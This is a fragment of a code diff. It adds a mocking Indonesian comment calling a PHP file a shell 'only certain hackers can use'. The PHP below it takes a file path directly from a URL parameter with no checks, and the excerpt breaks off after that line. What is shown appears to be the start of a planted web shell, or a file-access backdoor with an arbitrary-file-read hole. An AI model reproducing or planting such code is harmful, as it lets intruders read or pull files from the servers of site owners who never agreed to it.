@@ -1,3 +1,4 @@
+// Shell ini hanya Heker tertentu yang bisa gunain nya awowowok
 <?php
 if (isset($_GET['file']) && !empty($_GET['file'])) {
     $file_url = $_GET['file'];
